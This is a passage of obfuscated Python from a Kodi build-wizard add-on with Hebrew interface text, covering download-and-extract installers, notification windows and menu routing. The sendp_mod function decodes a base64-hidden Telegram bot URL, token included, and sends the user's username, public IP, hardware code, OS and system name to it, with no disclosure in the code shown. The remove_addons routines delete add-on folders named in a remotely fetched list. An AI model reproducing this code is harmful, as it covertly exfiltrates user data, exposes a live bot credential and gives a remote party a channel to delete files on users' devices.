      downloader .download (OOO000000O0OOO000 ,OO00O000O00OO0O00 ,DP )#line:5107
    xbmc .sleep (100 )#line:5108
    OOO0OO000O0O000OO ='מעדכן קבצים'#line:5109
    OO00OOOOO000OO00O ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO000O0O000OO )#line:5110
    try :#line:5111
        DP .update (0 ,OO00OOOOO000OO00O ,'','אנא המתן')#line:5112
    except :#line:5113
        DP .update (0 ,OO00OOOOO000OO00O +'\n'+''+'\n'+'אנא המתן')#line:5114
    extract .all (OO00O000O00OO0O00 ,HOME ,DP ,title =OO00OOOOO000OO00O )#line:5115
    DP .close ()#line:5116
    if INSTALLMETHOD ==1 :O0O00O000OO000O00 =1 #line:5118
    elif INSTALLMETHOD ==2 :O0O00O000OO000O00 =0 #line:5119
    else :DP .close ()#line:5120
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הושלם![/COLOR]'%COLOR2 )#line:5121
def sendp_mod (O0OO0O00OOO0O0O0O ):#line:5122
          import json ,requests #line:5124
          import platform as plat #line:5125
          O0O00OO0OOOOOOOO0 =(wiz .getS ("user"))#line:5128
          OO00O0O00000OO0OO =(wiz .getS ("pass"))#line:5129
          O00OO0000O000O0O0 =plat .uname ()#line:5130
          OO0OOOOOO00OOO0O0 =O00OO0000O000O0O0 [1 ]#line:5131
          OOOOOOO000OOOOO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:5132
          OO0O0OO0O0OOO0OO0 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUyMzY2MjUxODY6QUFGWWswSVBCdTROWjJ1WmxQWXpidVA5NkZyZ1B0UDhnUU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTc4ODIyNzI2MSZ0ZXh0PQ==').decode ('utf-8')#line:5133
          OO00OOOO000OO00OO =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:5135
          OO00OO0OOOOOOO000 =O0O00OO0OOOOOOOO0 #line:5137
          O0O000OO0OOOO0O00 =O0OO0O00OOO0O0O0O #line:5138
          OOOOOO0O00OO000OO =requests .get (OO0O0OO0O0OOO0OO0 +que ('בקשה לפתיחת תוכן טורקי: ')+O0O000OO0OOOO0O00 +que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OO00OO0OOOOOOO000 +que (' קודי: ')+OOOOOOO000OOOOO00 +que (' כתובת: ')+OO00OOOO000OO00OO +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+OO0OOOOOO00OOO0O0 ).json ()#line:5140
          OOOOOO0O00OO000OO =requests .get (OO0O0OO0O0OOO0OO0 +'@@@'+O0O000OO0OOOO0O00 ).json ()#line:5141
def install_turkey ():#line:5143
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]מוריד חיבלת תוכן טורקי[/COLOR]'%COLOR2 )#line:5145
    O0OOOOOOO0O0000O0 ="Dragon Turkey"#line:5148
    OOO00O0O0O000O00O ='https://github.com/vip200/victory/blob/master/plugin.video.dreamspeed.zip?raw=true'#line:5149
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5152
    try :#line:5153
        DP .create ('Dragon Turkey','[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0OOOOOOO0O0000O0 ),'','אנא המתן')#line:5154
    except :#line:5155
        DP .create ('Dragon Turkey','[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0OOOOOOO0O0000O0 ))#line:5156
    OO00OO000000OO0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OOOOOOO0O0000O0 )#line:5157
    try :os .remove (OO00OO000000OO0O0 )#line:5158
    except :pass #line:5159
    if 'google'in OOO00O0O0O000O00O :#line:5161
       googledrive_download (OOO00O0O0O000O00O ,OO00OO000000OO0O0 ,DP ,wiz .checkBuild (O0OOOOOOO0O0000O0 ,'updatesize'))#line:5162
    else :#line:5164
      downloader .download (OOO00O0O0O000O00O ,OO00OO000000OO0O0 ,DP )#line:5165
    xbmc .sleep (100 )#line:5166
    O000O0OOOO0O0OOO0 ='מעדכן קבצים'#line:5167
    OO0OO0O00OOOOO0O0 ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O0OOOO0O0OOO0 )#line:5168
    try :#line:5169
        DP .update (0 ,OO0OO0O00OOOOO0O0 ,'','אנא המתן')#line:5170
    except :#line:5171
        DP .update (0 ,OO0OO0O00OOOOO0O0 +'\n'+''+'\n'+'אנא המתן')#line:5172
    extract .all (OO00OO000000OO0O0 ,ADDONS ,DP ,title =OO0OO0O00OOOOO0O0 )#line:5173
    try :#line:5174
        open_dragon_menu_hub ()#line:5175
    except Exception as O0OOOOOO0OOOO0O0O :#line:5176
                    logging .warning ('dragon hub errrrrrrror'+str (O0OOOOOO0OOOO0O0O ))#line:5177
    DP .close ()#line:5178
def disply_hwr3 ():#line:5179
    from datetime import date #line:5180
    O0O0OOOO000O0O000 =date .today ()#line:5182
    O0OO0000O0000O000 =str (O0O0OOOO000O0O000 ).split ('-')[2 ]#line:5183
    OOOOOO0O0OO0O0O0O =tmdb_list (TMDB_NEW_API2 )#line:5185
    O0O0O00OO0OOOOOO0 =str ((getHwAddr ('eth0'))*OOOOOO0O0OO0O0O0O )#line:5186
    OO0OO0O0OOO0O0O00 =(O0O0O00OO0OOOOOO0 [1 ]+O0O0O00OO0OOOOOO0 [2 ]+O0OO0000O0000O000 )#line:5187
    sendp_mod (OO0OO0O0OOO0O0O00 )#line:5189
def install_turkey_bot ():#line:5190
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]מוריד חיבלת תוכן טורקי[/COLOR]'%COLOR2 )#line:5192
    OOOO0O0000OO00OO0 ="Dragon Turkey"#line:5195
    O00000OOOOOO000O0 ='https://github.com/vip200/victory/blob/master/plugin.video.dreamspeed.zip?raw=true'#line:5196
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5199
    try :#line:5200
        DP .create ('Dragon Turkey','[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOOO0O0000OO00OO0 ),'','אנא המתן')#line:5201
    except :#line:5202
        DP .create ('Dragon Turkey','[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOOO0O0000OO00OO0 ))#line:5203
    O00O00OO0O00O000O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOO0O0000OO00OO0 )#line:5204
    if 'google'in O00000OOOOOO000O0 :#line:5206
       googledrive_download (O00000OOOOOO000O0 ,O00O00OO0O00O000O ,DP ,wiz .checkBuild (OOOO0O0000OO00OO0 ,'updatesize'))#line:5207
    else :#line:5209
      downloader .download (O00000OOOOOO000O0 ,O00O00OO0O00O000O ,DP )#line:5210
    xbmc .sleep (100 )#line:5211
    OO00O0000000OO00O ='מעדכן קבצים'#line:5212
    O0OOOO000O00OO0O0 ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00O0000000OO00O )#line:5213
    try :#line:5214
        DP .update (0 ,O0OOOO000O00OO0O0 ,'','אנא המתן')#line:5215
    except :#line:5216
        DP .update (0 ,O0OOOO000O00OO0O0 +'\n'+''+'\n'+'אנא המתן')#line:5217
    extract .all (O00O00OO0O00O000O ,ADDONS ,DP ,title =O0OOOO000O00OO0O0 )#line:5218
    DP .close ()#line:5219
    xbmc .sleep (100 )#line:5221
    try :os .remove (O00O00OO0O00O000O )#line:5222
    except :pass #line:5223
    wiz .kodi17Fix ()#line:5224
def get_pincode (O00O0000000OOO0O0 ):#line:5225
    O000OO00000000O0O =time .time ()+300 #line:5227
    while (O00O0000000OOO0O0 =='empty'or O00O0000000OOO0O0 ==None ):#line:5228
          wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon'),'[COLOR %s]המתן לתגובה מ Dragon[/COLOR]'%COLOR2 )#line:5229
          O00O0000000OOO0O0 =telecode ()#line:5230
          if time .time ()>O000OO00000000O0O :#line:5231
            O00O0000000OOO0O0 ='play_tele'#line:5232
    return O00O0000000OOO0O0 #line:5233
def open_turkey ():#line:5235
    if wiz .getS ("dragon")=='true':#line:5236
        try :#line:5237
            OOOO0OOOOO0O0OOOO =xbmcgui .DialogBusy ()#line:5238
            OOOO0OOOOO0O0OOOO .create ()#line:5239
        except :#line:5240
           xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:5241
        OOO0O00OO0OOO0OOO =xbmcgui .Dialog ()#line:5242
        OOO0O0O00O00O0OO0 =OOO0O00OO0OOO0OOO .yesno ('Dragon Turkey',"התהליך מתבצע פחות מדקה, להמשך לחצו אישור.",yeslabel ="[B][COLOR WHITE]אישור[/COLOR][/B]",nolabel ="[B][COLOR white]ביטול[/COLOR][/B]")#line:5243
        if OOO0O0O00O00O0OO0 ==0 :#line:5244
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:5245
            sys .exit ()#line:5246
        else :#line:5247
            from datetime import date #line:5249
            OOO0OO00O00OOO000 =date .today ()#line:5251
            O00O0OO0OO00O0OOO =str (OOO0OO00O00OOO000 ).split ('-')[2 ]#line:5252
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]מבצע אימות, המתן...[/COLOR]'%COLOR2 )#line:5253
            from math import sqrt #line:5255
            OO0OO0OOOO00O0000 =tmdb_list (TMDB_NEW_API2 )#line:5256
            O0O0O0OO0OO000000 =str ((getHwAddr ('eth0'))*OO0OO0OOOO00O0000 )#line:5257
            OOOO0OOO0OO0OO000 =int (O0O0O0OO0OO000000 [1 ]+O0O0O0OO0OO000000 [2 ]+O00O0OO0OO00O0OOO )#line:5258
            OOO0OO00OO0O0O0OO =(str (round (sqrt ((OOOO0OOO0OO0OO000 *200 )+40 )+40 ,4 ))[-4 :]).replace ('.','')#line:5259
            if '.'in OOO0OO00OO0O0O0OO :#line:5260
             OOO0OO00OO0O0O0OO =(str (round (sqrt ((OOOO0OOO0OO0OO000 *200 )+40 )+40 ,4 ))[-5 :]).replace ('.','')#line:5261
            disply_hwr3 ()#line:5262
            OOO00O0OOOOO0OOO0 =get_pincode (code_link )#line:5269
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:5270
            if OOO00O0OOOOO0OOO0 ==OOO0OO00OO0O0O0OO :#line:5271
                install_turkey_bot ()#line:5272
                try :#line:5273
                    open_dragon_menu_hub ()#line:5274
                except Exception as OOOO0O0000O000OO0 :#line:5275
                                logging .warning ('dragon hub errrrrrrror'+str (OOOO0O0000O000OO0 ))#line:5276
                wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]התוכן נפתח![/COLOR]'%COLOR2 )#line:5277
            else :#line:5278
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]אין גישה לתוכן[/COLOR]'%COLOR2 )#line:5279
              sys .exit ()#line:5280
    else :#line:5281
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]לא פעיל[/COLOR]'%COLOR2 )#line:5282
def telemedia5 ():#line:5283
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מוריד טלמדיה לאנדרואיד 5[/COLOR]'%COLOR2 )#line:5284
    OO0OO00000O00OOOO =" Kodi Premium"#line:5287
    O000O00OO0O00O00O ='http://kodi.life/telemedia/telemedia.zip'#line:5288
    OOO00OO0O000000O0 =OO0OO00000O00OOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5289
    if not wiz .workingURL (O000O00OO0O00O00O )==True :return #line:5290
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5291
    try :#line:5292
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO0OO00000O00OOOO ),'','אנא המתן')#line:5293
    except :#line:5294
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO0OO00000O00OOOO ))#line:5295
    OO00O0O000OOOOO0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO00OO0O000000O0 )#line:5296
    try :os .remove (OO00O0O000OOOOO0O )#line:5297
    except :pass #line:5298
    if 'google'in O000O00OO0O00O00O :#line:5300
       googledrive_download (O000O00OO0O00O00O ,OO00O0O000OOOOO0O ,DP ,wiz .checkBuild (OO0OO00000O00OOOO ,'updatesize'))#line:5301
    else :#line:5303
      downloader .download (O000O00OO0O00O00O ,OO00O0O000OOOOO0O ,DP )#line:5304
    xbmc .sleep (100 )#line:5305
    O0000OOOOOOOOOOOO ='מעדכן קבצים'#line:5306
    O0O0O0OOOOO0O0OOO ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OOOOOOOOOOOO )#line:5307
    try :#line:5308
        DP .update (0 ,O0O0O0OOOOO0O0OOO ,'','אנא המתן')#line:5309
    except :#line:5310
        DP .update (0 ,O0O0O0OOOOO0O0OOO +'\n'+''+'\n'+'אנא המתן')#line:5311
    extract .all (OO00O0O000OOOOO0O ,HOME ,DP ,title =O0O0O0OOOOO0O0OOO )#line:5312
    DP .close ()#line:5313
    if INSTALLMETHOD ==1 :OO00000OO0O0OOOO0 =1 #line:5315
    elif INSTALLMETHOD ==2 :OO00000OO0O0OOOO0 =0 #line:5316
    else :DP .close ()#line:5317
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הושלם![/COLOR]'%COLOR2 )#line:5318
def testnotify ():#line:5323
    try :#line:5324
        OOO0000OO00OOOOOO =xbmcgui .DialogBusy ()#line:5325
        OOO0000OO00OOOOOO .create ()#line:5326
    except :#line:5327
       xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:5328
    O00O0OO00OOOOO0OO =wiz .workingURL (NOTIFICATION )#line:5329
    if O00O0OO00OOOOO0OO ==True :#line:5330
        try :#line:5331
            OO0OO0O0OOO00OO0O ,OOO000O00OO0O000O =wiz .splitNotify (NOTIFICATION )#line:5332
            if OO0OO0O0OOO00OO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון [/COLOR]"%COLOR2 );return #line:5333
            if STARTP ()=='ok':#line:5334
                notify .notification (OOO000O00OO0O000O ,True )#line:5336
        except Exception as OO000OO0OO0000O0O :#line:5337
            wiz .log ("Error on Notifications Window: %s"%str (OO000OO0OO0000O0O ),5 )#line:5338
    else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון[/COLOR]"%COLOR2 )#line:5339
    xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:5340
def testnotify2 ():#line:5341
	OOOOOOOOO00OO0OOO =wiz .workingURL (NOTIFICATION2 )#line:5342
	if OOOOOOOOO00OO0OOO ==True :#line:5343
		try :#line:5344
			O0OO00O0OO0OO000O ,OO0OOOOO0O00OOO00 =wiz .splitNotify (NOTIFICATION2 )#line:5345
			if O0OO00O0OO0OO000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון[/COLOR]"%COLOR2 );return #line:5346
			if STARTP ()=='ok':#line:5347
				notify .notification2 (OO0OOOOO0O00OOO00 ,True )#line:5348
		except Exception as O00OO00OO0OO00000 :#line:5349
			wiz .log ("Error on Notifications Window: %s"%str (O00OO00OO0OO00000 ),5 )#line:5350
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון [/COLOR]"%COLOR2 )#line:5351
def testnotify3 ():#line:5352
	O00OO00OO0OO0000O =wiz .workingURL (NOTIFICATION3 )#line:5353
	if O00OO00OO0OO0000O ==True :#line:5354
		try :#line:5355
			O0OOOO0OO00O000OO ,OOOOO00OOO0000OO0 =wiz .splitNotify (NOTIFICATION3 )#line:5356
			if O0OOOO0OO00O000OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5357
			if STARTP ()=='ok':#line:5358
				notify .notification3 (OOOOO00OOO0000OO0 ,True )#line:5359
		except Exception as OOOO00O0O00O0OO0O :#line:5360
			wiz .log ("Error on Notifications Window: %s"%str (OOOO00O0O00O0OO0O ),5 )#line:5361
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5362
def wait ():#line:5363
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:5364
def infobuild (test =''):#line:5365
    try :#line:5368
        O0OOO00OOO0O0O000 ,OOOOOOOOO00000OO0 =wiz .splitNotify (NOTIFICATION )#line:5369
        if O0OOO00OOO0O0O000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5370
        notify .updateinfo (OOOOOOOOO00000OO0 ,test )#line:5372
    except Exception as OOOO00O00O0O0OO0O :#line:5373
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5374
def infoupdate_busydialog (test =''):#line:5377
    try :#line:5378
        xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:5379
        OO000OO00O00O0O0O ,O0OO0OOO000000O00 =wiz .splitNotify (NOTIFICATION )#line:5380
        notify .updateinfo (O0OO0OOO000000O00 ,test )#line:5381
        xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:5382
    except Exception as OOOOO0OOOOO0000OO :#line:5383
        xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:5384
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין מידע[/COLOR]"%COLOR2 )#line:5385
def servicemanual ():#line:5386
	O0O00OOOO0OO000OO =wiz .workingURL (HELPINFO )#line:5387
	if O0O00OOOO0OO000OO ==True :#line:5388
		try :#line:5389
			O000OO0OO000OO0OO ,O0O0OOO000O000OOO =wiz .splitNotify (HELPINFO )#line:5390
			if O000OO0OO000OO0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5391
			notify .helpinfo (O0O0OOO000O000OOO ,True )#line:5392
		except Exception as OO0O0O00OOO000O0O :#line:5393
			wiz .log ("Error on Notifications Window: %s"%str (OO0O0O00OOO000O0O ),5 )#line:5394
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5395
def testupdate ():#line:5397
	if BUILDNAME =="":#line:5398
		notify .updateWindow ()#line:5399
	else :#line:5400
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5401
def testfirst ():#line:5403
	notify .firstRun ()#line:5404
def testfirstRun ():#line:5406
	notify .firstRunSettings ()#line:5407
def fastinstall ():#line:5410
	notify .firstRuninstall ()#line:5411
def addDir (O00O00OOO0O0OO00O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5418
    OOOOO0O0OOO0O0O0O =sys .argv [0 ]#line:5419
    if not mode ==None :OOOOO0O0OOO0O0O0O +="?mode=%s"%que (mode )#line:5420
    if not name ==None :OOOOO0O0OOO0O0O0O +="&name="+que (name )#line:5421
    if not url ==None :OOOOO0O0OOO0O0O0O +="&url="+que (url )#line:5422
    OOOO0000OOOO00O0O =True #line:5423
    if themeit :O00O00OOO0O0OO00O =themeit %O00O00OOO0O0OO00O #line:5424
    try :#line:5425
      O0O0OO00OOOOOOO0O =xbmcgui .ListItem (O00O00OOO0O0OO00O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5426
    except :#line:5427
      O0O0OO00OOOOOOO0O =xbmcgui .ListItem (O00O00OOO0O0OO00O )#line:5428
      O0O0OO00OOOOOOO0O .setArt ({'thumb':icon ,'fanart':icon ,'DefaultFolder.png':icon })#line:5429
    O0O0OO00OOOOOOO0O .setInfo (type ="Video",infoLabels ={"Title":O00O00OOO0O0OO00O ,"Plot":description })#line:5430
    O0O0OO00OOOOOOO0O .setProperty ("Fanart_Image",fanart )#line:5431
    if not menu ==None :O0O0OO00OOOOOOO0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5432
    OOOO0000OOOO00O0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOOO0O0OOO0O0O0O ,listitem =O0O0OO00OOOOOOO0O ,isFolder =True )#line:5433
    return OOOO0000OOOO00O0O #line:5434
def addFile (O00O00O00OOOO00OO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5436
    OO000O0O00OOOO000 =sys .argv [0 ]#line:5437
    try :#line:5438
        if not mode ==None :OO000O0O00OOOO000 +="?mode=%s"%que (mode )#line:5439
        if not name ==None :OO000O0O00OOOO000 +="&name="+que (name )#line:5440
        if not url ==None :OO000O0O00OOOO000 +="&url="+que (url )#line:5441
    except :#line:5442
        if not mode ==None :OO000O0O00OOOO000 +="?mode=%s"%que (mode )#line:5443
        if not name ==None :OO000O0O00OOOO000 +="&name="+que (name )#line:5444
        if not url ==None :OO000O0O00OOOO000 +="&url="+que (url )#line:5445
    OO0O0O0O00OO000O0 =True #line:5446
    if themeit :O00O00O00OOOO00OO =themeit %O00O00O00OOOO00OO #line:5447
    try :#line:5448
        O000O0000OO0O000O =xbmcgui .ListItem (O00O00O00OOOO00OO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5449
    except :#line:5450
        O000O0000OO0O000O =xbmcgui .ListItem (O00O00O00OOOO00OO )#line:5451
        O000O0000OO0O000O .setArt ({'thumb':icon ,'fanart':icon ,'DefaultFolder.png':icon })#line:5452
    O000O0000OO0O000O .setInfo (type ="Video",infoLabels ={"Title":O00O00O00OOOO00OO ,"Plot":description })#line:5453
    O000O0000OO0O000O .setProperty ("Fanart_Image",fanart )#line:5454
    if not menu ==None :O000O0000OO0O000O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5455
    OO0O0O0O00OO000O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO000O0O00OOOO000 ,listitem =O000O0000OO0O000O ,isFolder =False )#line:5456
    return OO0O0O0O00OO000O0 #line:5457
def get_params (user_params =''):#line:5460
        O00O0O00OOO000OOO =dict (parse_qsl (user_params .replace ('?','')))#line:5462
        return O00O0O00OOO000OOO #line:5463
def remove_addons ():#line:5464
	try :#line:5465
			import json #line:5466
			OO00OO0O0OO00OOOO =urlopen (remove_url ).readlines ()#line:5467
			for O00O0O0O00O00O0O0 in OO00OO0O0OO00OOOO :#line:5468
				OO0OO0OO00OO0O00O =O00O0O0O00O00O0O0 .split (':')[1 ].strip ()#line:5470
				OOOOOO000O0OO0O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OO0OO0OO00OO0O00O ,'false')#line:5471
				OOOO0O00O0OO00000 =xbmc .executeJSONRPC (OOOOOO000O0OO0O0O )#line:5472
				OOO0OO0000OOOOO00 =json .loads (OOOO0O00O0OO00000 )#line:5473
				O0O00OO00O00O00O0 =os .path .join (addons_folder ,OO0OO0OO00OO0O00O )#line:5475
				if os .path .exists (O0O00OO00O00O00O0 ):#line:5477
					for O00OOOOO00O0O0O0O ,OOOO0OOO00O0000O0 ,OOO00O00OOO00O0O0 in os .walk (O0O00OO00O00O00O0 ):#line:5478
						for OOOOOO00O00OOOOOO in OOO00O00OOO00O0O0 :#line:5479
							os .unlink (os .path .join (O00OOOOO00O0O0O0O ,OOOOOO00O00OOOOOO ))#line:5480
						for OOO0OOO00O00OO000 in OOOO0OOO00O0000O0 :#line:5481
							shutil .rmtree (os .path .join (O00OOOOO00O0O0O0O ,OOO0OOO00O00OO000 ))#line:5482
					os .rmdir (O0O00OO00O00O00O0 )#line:5483
			xbmc .executebuiltin ('Container.Refresh')#line:5485
			xbmc .executebuiltin ("UpdateLocalAddons()")#line:5486
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5487
	except :pass #line:5488
def remove_addons2 ():#line:5489
	try :#line:5490
			import json #line:5491
			OOO00O00O00O000OO =urlopen (remove_url2 ).readlines ()#line:5492
			for OOO0OOO0OOOOO000O in OOO00O00O00O000OO :#line:5493
				O00O0O0OOOOO0O0O0 =OOO0OOO0OOOOO000O .split (':')[1 ].strip ()#line:5495
				OOO00OOO0OOOO0OOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O00O0O0OOOOO0O0O0 ,'false')#line:5496
				O0000O0OO000O0OO0 =xbmc .executeJSONRPC (OOO00OOO0OOOO0OOO )#line:5497
				O0000OO0O0O000O0O =json .loads (O0000O0OO000O0OO0 )#line:5498
				OO00OOO00O0OO00O0 =os .path .join (user_folder ,O00O0O0OOOOO0O0O0 )#line:5500
				if os .path .exists (OO00OOO00O0OO00O0 ):#line:5502
					for O000O00OO0O0000O0 ,OO0O0O0OOOOOOOOOO ,OO0O0000O0OO00O00 in os .walk (OO00OOO00O0OO00O0 ):#line:5503
						for OO0O0O0O00O000OO0 in OO0O0000O0OO00O00 :#line:5504
							os .unlink (os .path .join (O000O00OO0O0000O0 ,OO0O0O0O00O000OO0 ))#line:5505
						for O0O0000OO0OO0O000 in OO0O0O0OOOOOOOOOO :#line:5506
							shutil .rmtree (os .path .join (O000O00OO0O0000O0 ,O0O0000OO0OO0O000 ))#line:5507
					os .rmdir (OO00OOO00O0OO00O0 )#line:5508
	except :pass #line:5510
def setView (O00O0OOOO0O0OO0O0 ,OO0OOO0OOO000O0O0 ):#line:5524
    if wiz .getS ('auto-view')=='true':#line:5525
        O00OO0O0O000O00O0 =wiz .getS (OO0OOO0OOO000O0O0 )#line:5526
        if O00OO0O0O000O00O0 =='50'and KODIV >=17 and SKIN =='skin.estuary':O00OO0O0O000O00O0 ='55'#line:5527
        if O00OO0O0O000O00O0 =='500'and KODIV >=17 and SKIN =='skin.estuary':O00OO0O0O000O00O0 ='50'#line:5528
        wiz .ebi ("Container.SetViewMode(%s)"%O00OO0O0O000O00O0 )#line:5529
def refresh_list (O0000OO000O00O000 ,OOOOOOO0OO00O0OOO ,Addon_id =""):#line:5530
    global name #line:5531
    O0OOO000OO00O0O00 =get_params (user_params =O0000OO000O00O000 )#line:5533
    OOOO00OOO0O0OO00O =None #line:5535
    name =None #line:5536
    O0O00O0OOO0000000 =None #line:5537
    try :O0O00O0OOO0000000 =unque (O0OOO000OO00O0O00 ["mode"])#line:5539
    except :pass #line:5540
    try :name =unque (O0OOO000OO00O0O00 ["name"])#line:5541
    except :pass #line:5542
    try :OOOO00OOO0O0OO00O =unque (O0OOO000OO00O0O00 ["url"])#line:5543
    except :pass #line:5544
    if O0O00O0OOO0000000 ==None :buildMenu ()#line:5545
    elif O0O00O0OOO0000000 =='user_info':wiz .user_info ()#line:5546
    elif O0O00O0OOO0000000 =='wizardupdate':wiz .wizardUpdate ()#line:5547
    elif O0O00O0OOO0000000 =='builds':buildMenu ()#line:5548
    elif O0O00O0OOO0000000 =='STARTP':STARTP ()#line:5549
    elif O0O00O0OOO0000000 =='viewbuild':viewBuild (name )#line:5552
    elif O0O00O0OOO0000000 =='buildinfo':buildInfo (name )#line:5553
    elif O0O00O0OOO0000000 =='buildpreview':buildVideo (name )#line:5554
    elif O0O00O0OOO0000000 =='install':buildWizard (name ,OOOO00OOO0O0OO00O )#line:5555
    elif O0O00O0OOO0000000 =='theme':buildWizard (name ,O0O00O0OOO0000000 ,OOOO00OOO0O0OO00O )#line:5556
    elif O0O00O0OOO0000000 =='editthird':editThirdParty (name );wiz .refresh ()#line:5558
    elif O0O00O0OOO0000000 =='maint':maintMenu (name )#line:5560
    elif O0O00O0OOO0000000 =='passpin':passandpin ()#line:5561
    elif O0O00O0OOO0000000 =='backmyupbuild':backmyupbuild ()#line:5562
    elif O0O00O0OOO0000000 =='kodi17fix':wiz .kodi17Fix ()#line:5563
    elif O0O00O0OOO0000000 =='kodi177fix':wiz .kodi177Fix ()#line:5564
